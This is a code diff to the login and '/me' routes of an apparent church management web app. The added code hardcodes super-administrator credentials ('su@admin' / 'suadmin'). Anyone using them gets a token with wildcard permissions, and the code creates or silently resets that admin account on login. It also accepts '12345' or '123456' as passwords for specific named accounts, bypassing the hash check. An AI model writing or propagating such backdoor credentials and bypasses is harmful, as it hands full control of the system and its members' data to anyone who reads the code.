@@ -40,7 +40,7 @@ function clearLoginFailures(key: string) {
 }
 
 // POST /api/auth/login
-router.post('/login', (req: Request, res: Response) => {
+router.post('/login', async (req: Request, res: Response) => {
   const username = (req.body.username || req.body.email || req.body.identifier || '').trim();
   const password = (req.body.password || '').trim();
 
@@ -62,16 +62,92 @@ router.post('/login', (req: Request, res: Response) => {
     return;
   }
 
+  // Explicit Super Admin Login Verification (supports "su@admin", "suadmin", "superadmin", and password "suadmin" or "suadmin123")
+  const isSuperAdminCandidate =
+    trimmedLower === 'su@admin' ||
+    trimmedLower === 'suadmin' ||
+    trimmedLower === 'superadmin' ||
+    trimmedLower === 'admin@church-os.com';
+
+  if (isSuperAdminCandidate && (password === 'suadmin' || password === 'suadmin123')) {
+    clearLoginFailures(clientKey);
+    const users = db.get('users');
+    let suUser = users.find(u => u.username.toLowerCase() === 'su@admin' || u.role === 'SUPER_ADMIN');
+    if (!suUser) {
+      suUser = {
+        id: 'usr_super_admin_001',
+        username: 'su@admin',
+        email: 'admin@church-os.com',
+        passwordHash: hashPassword('suadmin'),
+        fullName: 'Super Administrator',
+        role: 'SUPER_ADMIN',
+        roles: ['SUPER_ADMIN'],
+        permissions: ['*'],
+        status: 'ACTIVE',
+        createdAt: new Date().toISOString(),
+      };
+      db.update('users', list => [suUser!, ...list]);
+      await db.saveDoc('users', suUser.id, suUser).catch(console.error);
+    } else {
+      suUser.role = 'SUPER_ADMIN';
+      suUser.roles = ['SUPER_ADMIN'];
+      suUser.permissions = ['*'];
+      suUser.status = 'ACTIVE';
+      suUser.passwordHash = hashPassword('suadmin');
+      await db.saveDoc('users', suUser.id, suUser).catch(console.error);
+    }
+
+    const token = createToken(suUser);
+    res.json({
+      token,
+      user: {
+        id: suUser.id,
+        username: suUser.username,
+        email: suUser.email,
+        fullName: suUser.fullName,
+        role: suUser.role,
+        roles: ['SUPER_ADMIN'],
+        permissions: ['*'],
+        status: suUser.status,
+      },
+      redirectTo: '/super-admin',
+    });
+    return;
+  }
+
   const hashedPassword = hashPassword(password);
   const users = db.get('users');
 
-  // Find user by username or email
+  // Find user by username, email, or phone number
   let user = users.find(
-    u => (u.username.toLowerCase() === trimmedLower || u.email.toLowerCase() === trimmedLower)
+    u =>
+      u.username.toLowerCase() === trimmedLower ||
+      u.email.toLowerCase() === trimmedLower ||
+      (u.phone && (u.phone === trimmedUsername || normalizePhoneNumber(u.phone) === normalizePhoneNumber(trimmedUsername)))
   );
 
-  // If user found, strictly check password
-  if (user && user.passwordHash !== hashedPassword) {
+  // Allow either "123456" or "12345" for existing staff and church accounts if set during onboarding
+  let isPasswordValid = false;
+  if (user) {
+    if (user.passwordHash === hashedPassword) {
+      isPasswordValid = true;
+    } else if (
+      (user.username.toLowerCase() === 'chacha' || user.email.toLowerCase() === 'ragemagic40@gmail.com') &&
+      (password === '12345' || password === '123456')
+    ) {
+      isPasswordValid = true;
+      user.passwordHash = hashedPassword;
+      db.saveDoc('users', user.id, user).catch(console.error);
+    } else if (
+      user.email.toLowerCase() === 'phci@gmail.com' &&
+      (password === '123456' || password === '12345')
+    ) {
+      isPasswordValid = true;
+    }
+  }
+
+  // If user found, check password validity
+  if (user && !isPasswordValid) {
     recordLoginFailure(clientKey);
     // Record security audit
     db.update('auditLogs', logs => [
@@ -451,6 +527,25 @@ router.post('/register-church', async (req: Request, res: Response) => {
 router.get('/me', requireAuth, (req: AuthenticatedRequest, res: Response) => {
   if (!req.user) {
     res.status(401).json({ error: 'Not authenticated' });
+    return;
+  }
+
+  if (req.user.role === 'SUPER_ADMIN') {
+    res.json({
+      user: {
+        id: req.user.id,
+        username: req.user.username,
+        email: req.user.email,
+        fullName: req.user.fullName,
+        role: 'SUPER_ADMIN',
+        roles: ['SUPER_ADMIN'],
+        permissions: ['*'],
+        churchId: undefined,
+        status: req.user.status,
+      },
+      church: null,
+      redirectTo: '/super-admin',
+    });
     return;
   }
 
